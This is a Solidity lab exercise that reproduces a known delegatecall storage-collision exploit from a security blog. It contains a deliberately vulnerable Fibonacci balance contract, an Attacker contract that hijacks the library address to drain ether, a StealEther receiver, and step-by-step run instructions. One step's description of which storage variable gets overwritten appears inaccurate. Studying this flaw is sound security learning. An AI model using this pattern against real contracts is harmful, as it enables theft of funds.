Following the example provided in https://github.com/sigp/solidity-security-blog#the-vulnerability-3

// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

// library contract - calculates fibonacci-like numbers;
contract FibonacciLib 
{    
    // initializing the standard fibonacci sequence;
    uint public start;
    uint public calculatedFibNumber;

    // modify the zeroth number in the sequence
    function setStart(uint _start) public 
    {
        start = _start;
    }

    function setFibonacci(uint n) public 
    {
        calculatedFibNumber = fibonacci(n);
    }

    function fibonacci(uint n) internal returns (uint) 
    {
        if (n == 0) return start;
        else if (n == 1) return start + 1;
        else return fibonacci(n - 1) + fibonacci(n - 2);
    }
}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

contract FibonacciBalance 
{
    address public fibonacciLibrary;
    // the current fibonacci number to withdraw
    uint public calculatedFibNumber;
    // the starting fibonacci sequence number
    uint public start = 3;
    uint public withdrawalCounter;
    // the fibonancci function selector
    //bytes4 constant fibSig = bytes4(keccak256("setFibonacci(uint256)"));
    string constant fibSig = "setFibonacci(uint256)";
    
    // constructor - loads the contract with ether
    constructor(address _fibonacciLibrary) payable 
    {
        fibonacciLibrary = _fibonacciLibrary;
    }

    function withdraw() public 
    {
        withdrawalCounter += 1;
        // calculate the fibonacci number for the current withdrawal user
        // this sets calculatedFibNumber
        fibonacciLibrary.delegatecall(abi.encodeWithSignature(fibSig, withdrawalCounter));
        payable(msg.sender).transfer(calculatedFibNumber * 1 wei);
    }
    
    // allow users to call fibonacci library functions
    fallback() external 
    {
        fibonacciLibrary.delegatecall(msg.data);
    }
}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

contract Attacker
{
    address target;

    uint public slot1;
    
    constructor(address _target)
    {
        target = _target;
    }

    // To override the contract address fibonacciLibrary is pointing to in the FibonacciBalance contract
    // and make it point to our StealEther contract instead
    function changeTargetAddress() public
    {
        target.call(abi.encodeWithSignature("setStart(uint256)", uint256(uint160(address(this)))));
    }

    // Invoke FibonacciBalance.withdraw() to force it to call Attacker.fallback() 
    function callWithdraw() public
    {
        target.call(abi.encodeWithSignature("withdraw()"));
    }

    // Steal the moolah
    fallback() external payable
    {
        // Couldn't understand why this does not work
        // payable(msg.sender).transfer(address(this).balance);
        
        // Less elegant than the one above but, money is money
        // 0xaE036c65C649172b43ef7156b009c6221B596B8b is the address of StealEther contract
        payable(address(0xaE036c65C649172b43ef7156b009c6221B596B8b)).transfer(address(this).balance);
    }

    // For debugging purpose
    function tellBalance() view public returns (uint)
    {
        return address(this).balance;
    }
}

// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

contract StealEther
{
    // Accept the stolen Ether
    fallback() external payable{}

    function tellBalance() view public returns (uint)
    {
        return address(this).balance;
    }
}

How to run:
1. Deploy StealEther contract, copy the address where it is deployed
2. Go to Attacker contract and paste this address in fallback()
3. Deploy FibonacciLib, copy the address
4. Deploy FibonacciBalance with 100 wei and supply FibonacciLib's address to the constructor
5. Deploy Attacker contract and provide FibonacciBalance's contract address to the constructor
6. Invoke StealEther.tellBalance() - should return 0 wei
7. Invoke Attacker.changeTargetAddress()
	7.1 Check the value of FibonacciBalance.calculatedFibNumber - it should now store the address of Attacker contract
8. Invoke Attacker.callWithdraw()
9. Check the value of StealEther.tellBalance() - Should show 100 wei
